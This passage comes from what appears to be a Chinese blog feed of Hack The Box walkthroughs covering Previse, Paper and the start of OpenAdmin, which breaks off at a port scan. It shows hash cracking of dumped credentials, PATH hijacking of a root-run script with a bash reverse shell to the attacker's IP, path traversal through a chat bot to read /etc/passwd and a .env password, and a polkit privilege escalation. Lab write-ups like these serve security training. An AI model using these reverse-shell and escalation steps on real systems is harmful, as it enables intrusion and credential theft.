10.10.16.7:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: <span class="hljs-string">&#x27;CVE-2021-2043.py&#x27;</span><br><br>CVE-2021-2043.py    100%[===================&gt;]   3.37K  16.0KB/s    <span class="hljs-keyword">in</span> 0.2s    <br><br>2022-05-17 08:03:44 (16.0 KB/s) - <span class="hljs-string">&#x27;CVE-2021-2043.py&#x27;</span> saved [3448/3448]<br><br>www-data@previse:/var/www/html$ <span class="hljs-built_in">ls</span><br>CVE-2021-2043.py    css       files.php   logout.php<br>accounts.php    download.php       footer.php  logs.php<br>android-chrome-192x192.png  favicon-16x16.png  header.php  nav.php<br>android-chrome-512x512.png  favicon-32x32.png  index.php   site.webmanifest<br>apple-touch-icon.png    favicon.ico        js   status.php<br>config.php    file_logs.php      login.php<br>www-data@previse:/var/www/html$ python ./CVE-2021-2043.py <br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br></code></pre></td></tr></table></figure><h4 id="Elevated-privileges-number-two："><a href="#Elevated-privileges-number-two：" class="headerlink" title="Elevated privileges number two："></a>Elevated privileges number two：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@previse:/var/www/html$ <span class="hljs-built_in">cat</span> config.php <br>&lt;?php<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">connectDB</span></span>()&#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br>    <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;mySQL_p@ssw0rd!:)&#x27;</span>;<br>    <span class="hljs-variable">$db</span> = <span class="hljs-string">&#x27;previse&#x27;</span>;<br>    <span class="hljs-variable">$mycon</span> = new mysqli(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$passwd</span>, <span class="hljs-variable">$db</span>);<br>    <span class="hljs-built_in">return</span> <span class="hljs-variable">$mycon</span>;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@previse:/var/www/html$ mysql -h localhost -u root -p<span class="hljs-string">&#x27;mySQL_p@ssw0rd!:)&#x27;</span><br>mysql&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| previse            |<br>| sys                |<br>+--------------------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br>mysql&gt; use previse<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>mysql&gt; use previse;<br>Database changed<br>mysql&gt; show tables;<br>+-------------------+<br>| Tables_in_previse |<br>+-------------------+<br>| accounts          |<br>| files             |<br>+-------------------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; <span class="hljs-keyword">select</span> * from accounts;<br>+----+----------+------------------------------------+---------------------+<br>| <span class="hljs-built_in">id</span> | username | password                           | created_at          |<br>+----+----------+------------------------------------+---------------------+<br>|  1 | m4lwhere | $1$🧂llol<span class="hljs-variable">$DQpmdvnb7EeuO6UaqRItf</span>. | 2021-05-27 18:18:36 |<br>|  2 | hacker   | $1$🧂llol<span class="hljs-variable">$bwwe9x8dIfOj05MYTXy3V1</span> | 2022-05-17 07:15:43 |<br>+----+----------+------------------------------------+---------------------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p>可以到hash示例页面看一眼是什么哈希，应该是md5crypt：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://hashcat.net/wiki/doku.php?id=example_hashes<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; hashcat -m 500 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt        <br>hashcat (v6.2.5) starting<br><br>OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>=====================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1428/2920 MB (512 MB allocatable), 4MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Single-Hash<br>* Single-Salt<br><br>$1$🧂llol<span class="hljs-variable">$DQpmdvnb7EeuO6UaqRItf</span>.:ilovecody112235!<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@previse:/var/www/html$ su m4lwhere<br>Password: <br>m4lwhere@previse:/var/www/html$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> m4lwhere: <br>User m4lwhere may run the following commands on previse:<br>    (root) /opt/scripts/access_backup.sh<br>m4lwhere@previse:/var/www/html$ <span class="hljs-built_in">cat</span> /opt/scripts/access_backup.sh <br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-comment"># We always make sure to store logs, we take security SERIOUSLY here</span><br><br><span class="hljs-comment"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span><br><span class="hljs-comment"># This is configured to run with cron, added to sudo so I can run as needed - we&#x27;ll fix it later when there&#x27;s time</span><br><br>gzip -c /var/log/apache2/access.log &gt; /var/backups/$(<span class="hljs-built_in">date</span> --<span class="hljs-built_in">date</span>=<span class="hljs-string">&quot;yesterday&quot;</span> +%Y%b%d)_access.gz<br>gzip -c /var/www/file_access.log &gt; /var/backups/$(<span class="hljs-built_in">date</span> --<span class="hljs-built_in">date</span>=<span class="hljs-string">&quot;yesterday&quot;</span> +%Y%b%d)_file_access.gz<br>m4lwhere@previse:/var/www/html$     <br></code></pre></td></tr></table></figure><p>gzip没有使用绝对路径，可以更改环境变量被利用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash&#x27;</span> &gt; gzip                 <br>m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.7/9002 0&gt;&amp;1&quot;</span> &gt;&gt; gzip<br>m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">cat</span> gzip <br><span class="hljs-comment">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/10.10.16.7/9002 0&gt;&amp;1<br>m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">export</span> PATH=/dev/shm:<span class="hljs-variable">$PATH</span><br>m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br>m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">chmod</span> +x ./gzip <br>m4lwhere@previse:/dev/shm$ sudo /opt/scripts/access_backup.sh<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9002<br>listening on [any] 9002 ...<br>connect to [10.10.16.7] from (UNKNOWN) [10.10.11.104] 51578<br>root@previse:/dev/shm<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Paper</title>
    <link href="/post/HackThebox-Paper.html"/>
    <url>/post/HackThebox-Paper.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs BASH"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Mon Jun  6 15:31:57 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt -T4 10.10.11.143</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.143<br>Host is up (0.43s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT    STATE SERVICE VERSION<br>22/tcp  open  ssh     OpenSSH 8.0 (protocol 2.0)<br>80/tcp  open  http    Apache httpd 2.4.37 ((centos) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>k mod_fcgid/<span class="hljs-number">2.3</span>.<span class="hljs-number">9</span>)<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: HTTP Server Test Page powered by CentOS<br>|_http-generator: HTML Tidy for HTML5 for Linux version <span class="hljs-number">5.7</span>.<span class="hljs-number">28</span><br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">37</span> (centos) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>k mod_fcgid/<span class="hljs-number">2.3</span>.<span class="hljs-number">9</span><br><span class="hljs-number">443</span>/tcp open  ssl<br>|_http-title: <span class="hljs-number">400</span> Bad Request<br>|_ip-https-discover: ERROR: Script execution failed (use -d to debug)<br>|_ssl-known-key: ERROR: Script execution failed (use -d to debug)<br>| ssl-cert: OpenSSL required to parse certificate.<br>| -----BEGIN CERTIFICATE-----<br>| MIIE4DCCAsigAwIBAgIIdryw6eirdUUwDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV<br>| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMzg5OTI3<br>| OTIyMzE4NTM3NzA2MTEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw<br>| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjAeFw0yMTA3<br>| MDMwODUyMzRaFw0yMjA3MDgxMDMyMzRaMG4xCzAJBgNVBAYTAlVTMRQwEgYDVQQK<br>| DAtVbnNwZWNpZmllZDEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw<br>| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJ<br>| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAL1/<span class="hljs-number">3</span>n1pZvFgeX1ja/w84jNxT2NcBkux<br>| s5DYnYKeClqncxe7m4mz+my4uP6J1kBP5MudLe6UE62KFX3pGc6HCp2G0CdA1gQm<br>| <span class="hljs-number">4</span>WYgF2E7aLNHZPrKQ+r1fqBBw6o3NkNxS4maXD7AvrCqkgpID/qSziMJdUzs9mS+<br>| NTzWq0IuSsTztLpxUEFv7T6XPGkS5/pE2hPWO0vz/Bd5BYL+<span class="hljs-number">3</span>P08fPsC0/<span class="hljs-number">5</span>YvgkV<br>| uvFbFrxmuOFOTEkrTy88b2fLkbt8/Zeh4LSdmQqriSpxDnag1i3N++<span class="hljs-number">1</span>aDkIhAhbA<br>| LPK+rZq9PmUUFVY9MqizBEixxRvWhaU9gXMIy9ZnPJPpjDqyvju5e+kCAwEAAaNg<br>| MF4wDgYDVR0PAQH/BAQDAgWgMAkGA1UdEwQCMAAwIAYDVR0RBBkwF4IVbG9jYWxo<br>| b3N0LmxvY2FsZG9tYWluMB8GA1UdIwQYMBaAFBB8mEcpW4ZNBIaoM7mCF/Z+<span class="hljs-number">7</span>ffA<br>| MA0GCSqGSIb3DQEBCwUAA4ICAQCw4uQfUe+FtsPdT0eXiLHg/<span class="hljs-number">5</span>kXBGn8kfJZ45hP<br>| gcuwa5JfAQeA3JXx7piTSiMMk0GrWbqbrpX9ZIkwPnZrN+<span class="hljs-number">9</span>PV9/SNCEJVTMy+LDQ<br>| QGsyqwkZpMK8QThzxRvXvnyf3XeEFDL6N4YeEzWz47VNlddeqOBHmrDI5SL+Eibh<br>| wxNj9UXwhEySUpgMAhU+QtXk40sjgv4Cs3kHvERvpwAfgRA7N38WY+njo/<span class="hljs-number">2</span>VlGaT<br>| qP+UekP42JveOIWhf9p88MUmx2QqtOq/WF7vkBVbAsVs+GGp2SNhCubCCWZeP6qc<br>| HCX0/ipKZqY6zIvCcfr0wHBQDY9QwlbJcthg9Qox4EH1Sgj/qKPva6cehp/NzsbS<br>| JL9Ygb1h65Xpy/ZwhQTl+y2s+JxAoMy3k50n+<span class="hljs-number">9</span>lzCFBiNzPLsV6vrTXCh7t9Cx07<br>| <span class="hljs-number">9</span>jYqMiQ35cEbQGIaKQqzguPXF5nMvWDBow3Oj7fYFlCdLTpaTjh8FJ37/PrhUWIl<br>| Li+WW8txrQKqm0/u1A41TI7fBxlUDhk6YFA+gIxX27ntQ0g+lLs8rwGlt/o+e3Xa<br>| OfcJ7Tl0ovWa+c9lWNju5mgdU+<span class="hljs-number">0</span>v4P9bqv4XcIuyE0exv5MleA99uOYE1jlWuKf1<br>| m9v4myEY3dzgw3IBDmlYpGuDWQmMYx8RVytYN3Z3Z64WglMRjwEWNGy7NfKm7oJ4<br>| mh/ptg==<br>|_-----END CERTIFICATE-----<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">37</span> (centos) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>k mod_fcgid/<span class="hljs-number">2.3</span>.<span class="hljs-number">9</span><br>| tls-alpn: <br>|_  http/<span class="hljs-number">1.1</span><br>|_ssl-date: TLS randomness does not represent time<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br># Nmap done at Mon Jun  <span class="hljs-number">6</span> <span class="hljs-number">15</span>:<span class="hljs-number">45</span>:<span class="hljs-number">44</span> <span class="hljs-number">2022</span> -- <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">827.29</span> seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ whatweb http://paper.htb<br>http://paper.htb/ [403 Forbidden] Apache[2.4.37][mod_fcgid/2.3.9], Country[RESERVED][ZZ], Email[webmaster@example.com], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], IP[10.10.11.143], MetaGenerator[HTML Tidy <span class="hljs-keyword">for</span> HTML5 <span class="hljs-keyword">for</span> Linux version 5.7.28], OpenSSL[1.1.1k], PoweredBy[CentOS], Title[HTTP Server Test Page powered by CentOS], UncommonHeaders[x-backend-server], X-Backend[office.paper]<br></code></pre></td></tr></table></figure><p> X-Backend[office.paper]看起来像是一个子域。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220606162217484.png" alt="image-20220606162217484"></p><p>另一片天地，wordpress。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ searchsploit wordpress 5.2.3<br>------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                                                               |  Path<br>------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>WordPress Core 5.2.3 - Cross-Site Host Modification                                                                                                          | php/webapps/47361.pl<br>WordPress Core &lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                                      | multiple/webapps/47690.md<br>WordPress Core &lt; 5.3.x - <span class="hljs-string">&#x27;xmlrpc.php&#x27;</span> Denial of Service                                                                                                      | php/dos/47800.py<br>WordPress Plugin DZS Videogallery &lt; 8.60 - Multiple Vulnerabilities                                                                                          | php/webapps/39553.txt<br>WordPress Plugin iThemes Security &lt; 7.0.3 - SQL Injection                                                                                                    | php/webapps/44943.txt<br>WordPress Plugin Rest Google Maps &lt; 7.11.18 - SQL Injection                                                                                                  | php/webapps/48918.sh<br>------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br>Papers: No Results<br>$ searchsploit -m multiple/webapps/47690.md<br>  Exploit: WordPress Core &lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts<br>      URL: https://www.exploit-db.com/exploits/47690<br>     Path: /usr/share/exploitdb/exploits/multiple/webapps/47690.md<br>File Type: ASCII text<br><br>Copied to: /home/mosaic/tmp/47690.md<br></code></pre></td></tr></table></figure><p>根据漏洞的提示，我访问了<a href="http://office.paper/?static=1%EF%BC%9A">http://office.paper/?static=1：</a></p><p>我又发现一个域名：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220606162907848.png" alt="image-20220606162907848"></p><p>跳转过去会是一个注册按钮，也可以随便注册，我登录了进去并加入了它们的聊天室：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220606163226105.png" alt="image-20220606163226105"></p><p>它们说群里有个机器人，虽然我不能发消息，但是我可以私聊机器人：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220606163651242.png" alt="image-20220606163651242"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">recyclops file ../../../../etc/passwd<br></code></pre></td></tr></table></figure><p>在返回信息中我发现了两个可以被用来登录的用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rocketchat❌1001:1001::/home/rocketchat:/bin/bash<br>dwight❌1004:1004::/home/dwight:/bin/bash<br></code></pre></td></tr></table></figure><p>也可以遍历目录：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220606164638972.png" alt="image-20220606164638972"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220606164926377.png" alt="image-20220606164926377"></p><p>但是读取不了。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">recyclops</span></span> <span class="hljs-keyword">file</span> ../hubot/.env<br></code></pre></td></tr></table></figure><p>我找到了像是密码的东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!=====Contents of file ../hubot/.env=====&gt;<br><span class="hljs-built_in">export</span> ROCKETCHAT_URL=<span class="hljs-string">&#x27;http://127.0.0.1:48320&#x27;</span><br><span class="hljs-built_in">export</span> ROCKETCHAT_USER=recyclops<br><span class="hljs-built_in">export</span> ROCKETCHAT_PASSWORD=Queenofblad3s!23<br><span class="hljs-built_in">export</span> ROCKETCHAT_USESSL=<span class="hljs-literal">false</span><br><span class="hljs-built_in">export</span> RESPOND_TO_DM=<span class="hljs-literal">true</span><br><span class="hljs-built_in">export</span> RESPOND_TO_EDITED=<span class="hljs-literal">true</span><br><span class="hljs-built_in">export</span> PORT=8000<br><span class="hljs-built_in">export</span> BIND_ADDRESS=127.0.0.1<br>&lt;!=====End of file ../hubot/.env=====&gt;<br></code></pre></td></tr></table></figure><p>但是列表里并有这个用户。或许它们会密码复用？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh dwight@10.10.11.143<br>dwight@10.10.11.143<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Activate the web console with: systemctl enable --now cockpit.socket</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23</span><br><span class="hljs-string">[dwight@paper ~]$ </span><br></code></pre></td></tr></table></figure><p>在遍历SUID时发现了 polkit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ searchsploit polkit         <br>------------------------------------------------------------- ---------------------------------<br> Exploit Title                                               |  Path<br>------------------------------------------------------------- ---------------------------------<br>Linux Kernel 4.15.x &lt; 4.19.2 - <span class="hljs-string">&#x27;map_write() CAP_SYS_ADMIN&#x27;</span> L | linux/local/47167.sh<br>Linux Polkit - pkexec helper PTRACE_TRACEME <span class="hljs-built_in">local</span> root (Meta | linux/local/47543.rb<br>PolicyKit polkit-1 &lt; 0.101 - Local Privilege Escalation      | linux/local/17932.c<br>polkit - Temporary auth Hijacking via PID Reuse and Non-atom | linux/dos/46105.c<br>Polkit 0.105-26 0.117-2 - Local Privilege Escalation         | linux/local/50011.sh<br>systemd - Lack of Seat Verification <span class="hljs-keyword">in</span> PAM Module Permits Sp | linux/dos/46743.txt<br>------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br>------------------------------------------------------------- ---------------------------------<br> Paper Title                                                 |  Path<br>------------------------------------------------------------- ---------------------------------<br>Polkit Authentication bypass Local Privesc - Paper           | docs/english/50550-polkit-authen<br>Polkit CVE-2021-3560 - Paper                                 | docs/english/50584-polkit-cve-20<br>Polkit CVE-2021-3560 - Paper (Spanish)                       | docs/spanish/50607-polkit-cve-20<br>------------------------------------------------------------- ---------------------------------<br></code></pre></td></tr></table></figure><p>报错归报错是因为HTB主机都不出网，但并不影响shell为root：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@paper dwight]<span class="hljs-comment"># ls</span><br>CVE-2021-3560.py  bot_restart.sh  hubot  sales  user.txt<br>[root@paper dwight]<span class="hljs-comment"># cd /</span><br>[root@paper /]<span class="hljs-comment"># ;s</span><br>bash: syntax error near unexpected token `;<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[root@paper /]# ls</span><br><span class="hljs-string">bin   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="hljs-string">boot  etc  lib   media  opt  root  sbin  sys  usr</span><br><span class="hljs-string">[root@paper /]# cd /root/</span><br><span class="hljs-string">[root@paper ~]# ls</span><br><span class="hljs-string">anaconda-ks.cfg  initial-setup-ks.cfg  root.txt</span><br><span class="hljs-string">[root@paper ~]# cat root.txt </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - OpenAdmin</title>
    <link href="/post/HackTheBox-OpenAdmin.html"/>
    <url>/post/HackTheBox-OpenAdmin.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/OpenAdmin.png" alt="OpenAdmin"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.171<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-22 06:01:02 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.10.171                                    <br>Discovered open port 80/tcp on 10.10.10.171 <br>Crazy:~/HackThebox/OpenAdmin$ sudo nmap -sC -sV 10.10.10.171 -oN OpenAdmin -p22,80 <br>[sudo] crazyinside 的密码：<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-22 14:03 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 